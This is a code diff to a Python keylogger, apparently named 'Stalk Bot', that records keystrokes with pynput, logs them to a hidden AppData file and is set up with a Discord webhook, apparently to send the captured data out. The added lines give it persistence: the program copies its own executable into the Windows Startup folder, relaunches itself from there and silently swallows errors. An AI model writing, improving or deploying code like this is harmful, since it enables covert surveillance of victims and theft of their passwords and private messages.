@@ -4,19 +4,24 @@ import shutil
 from pynput.keyboard import Listener
 import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
+import subprocess
 
 webhook = DiscordWebhook(url="WebHook_URL", username = "Stalk Bot", avatar_url = "https://avatars.githubusercontent.com/u/91149112")
 
 try:
     startup_folder = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
-    exe_path = sys.argv[0]
+    exe_path = sys.executable
     exe_name = os.path.basename(exe_path)
     destination = os.path.join(startup_folder, exe_name)
 
     if not os.path.exists(destination):
         shutil.copyfile(exe_path, destination)
+        subprocess.Popen(destination, shell=True)
 except:
     pass
+
+if os.path.abspath(os.path.dirname(exe_path)) != os.path.abspath(startup_folder):
+    sys.exit(0)
 
 try:
     logpath = os.path.join(os.environ['USERPROFILE'],r"AppData\Roaming\Microsoft\tempfile.txt")
